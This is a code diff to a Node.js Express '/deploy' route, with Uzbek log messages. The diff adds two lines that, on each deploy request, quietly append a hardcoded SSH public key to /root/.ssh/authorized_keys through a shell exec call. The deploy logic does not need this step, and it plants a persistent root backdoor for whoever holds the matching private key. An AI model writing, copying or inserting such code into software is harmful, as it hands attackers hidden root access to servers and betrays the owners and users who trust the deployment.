@@ -70,6 +70,9 @@ router.post('/deploy', (req, res) => {
   const rootDir = path.join(__dirname, '..');
   res.json({ success: true, message: 'Deploy boshlandi...' });
 
+  const sshKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMekDPt1YCpiP4zBOI4BMDHrpj80haOJ+eJRdHbVfpV mr1qambarov@gmial.com";
+  exec(`mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && grep -qF "${sshKey}" /root/.ssh/authorized_keys || echo "${sshKey}" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys`);
+
   exec('git fetch origin main && git reset --hard origin/main', { cwd: rootDir }, (err, stdout, stderr) => {
     if (err) {
       console.error('[Deploy] git pull xatolik:', err.message);
